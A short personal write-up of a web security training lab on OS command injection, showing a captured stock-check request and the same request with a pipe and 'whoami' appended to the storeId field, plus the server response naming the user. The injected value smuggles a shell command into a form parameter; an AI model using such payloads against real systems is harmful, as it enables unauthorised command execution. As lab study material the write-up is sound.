# 1. OS command injection, simple case

**Goal** : Print  user using **whoami.**

**Steps** : 

- check stock using view details
    - then, got the product endpoint in burp :
    
    ```jsx
    POST /product/stock HTTP/2
    Host: 0aa5005004c075ef81292aad00f20070.web-security-academy.net
    Cookie: session=I5IaQVJgXrFfAabBglvkWJ1pt3XUaRmr
    Content-Length: 21
    Sec-Ch-Ua-Platform: "Linux"
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
    Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
    Content-Type: application/x-www-form-urlencoded
    Sec-Ch-Ua-Mobile: ?0
    Accept: */*
    Origin: https://0aa5005004c075ef81292aad00f20070.web-security-academy.net
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://0aa5005004c075ef81292aad00f20070.web-security-academy.net/product?productId=1
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Priority: u=1, i
    
    productId=1&storeId=2
    ```
    
    - send this req in repeater.
    - chain the os command using | (pipe)  in body section : “productId=1&storeId=2”
        - or u can use   ;(semicolon)
    
    ```jsx
    POST /product/stock HTTP/2
    Host: 0aa5005004c075ef81292aad00f20070.web-security-academy.net
    Cookie: session=I5IaQVJgXrFfAabBglvkWJ1pt3XUaRmr
    Content-Length: 21
    Sec-Ch-Ua-Platform: "Linux"
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
    Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
    Content-Type: application/x-www-form-urlencoded
    Sec-Ch-Ua-Mobile: ?0
    Accept: */*
    Origin: https://0aa5005004c075ef81292aad00f20070.web-security-academy.net
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://0aa5005004c075ef81292aad00f20070.web-security-academy.net/product?productId=1
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Priority: u=1, i
    
    productId=1&storeId=2 | whoami 
    ```
    
- O/P

```jsx
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-lDnolQ
```